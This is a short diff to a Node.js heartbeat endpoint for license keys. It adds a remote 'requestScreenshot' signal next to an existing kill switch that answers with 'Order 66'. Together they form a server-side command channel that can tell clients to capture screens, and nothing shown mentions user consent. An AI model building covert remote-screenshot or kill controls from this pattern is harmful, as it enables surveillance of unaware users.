@@ -93,16 +93,28 @@ module.exports = async function handler(req, res) {
 
             // Check for KILL SWITCH (Only if auto-ban enforcement is enabled)
             const autoBanEnabled = String(keyData.autoBanEnabled) !== 'false';
+            
+            // Check for Remote Screenshot Request
+            const requestScreenshot = await redis.hget(`key:${key}`, 'requestScreenshot');
+            let screenshotSignal = false;
+            if (requestScreenshot === 'true') {
+                screenshotSignal = true;
+                await redis.hdel(`key:${key}`, 'requestScreenshot');
+                console.log(`[SCREENSHOT] Signal triggered and cleared for ${key}`);
+            }
+
             if (autoBanEnabled && String(keyData.killSwitch) === 'true') {
                 return res.status(200).json({
                     success: true,
                     kill: true,
+                    requestScreenshot: screenshotSignal,
                     message: 'Order 66'
                 });
             }
 
             return res.status(200).json({
                 success: true,
+                requestScreenshot: screenshotSignal,
                 message: 'Heartbeat received'
             });
         }
